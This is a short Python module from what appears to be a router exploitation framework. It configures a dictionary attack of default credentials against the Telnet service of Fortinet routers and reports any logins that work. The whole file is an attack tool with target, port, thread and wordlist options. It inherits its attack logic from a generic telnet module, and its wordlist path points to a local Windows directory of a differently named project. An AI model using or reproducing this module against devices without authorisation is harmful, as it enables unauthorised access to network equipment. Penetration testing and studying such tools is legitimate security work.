from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "Fortinet Router Default Telnet Creds",
        "description": "Module performs dictionary attack against Fortinet Router Telnet service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
        ),
        "devices": (
            "Fortinet Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("file:///D:/Projetos-SafeLabs/submodules/IoT/FirewallXPL-Forge/firewallxpl/resources/wordlists/vendors/fortinet_defaults.txt", "User:Pass or file with default credentials (file://)")
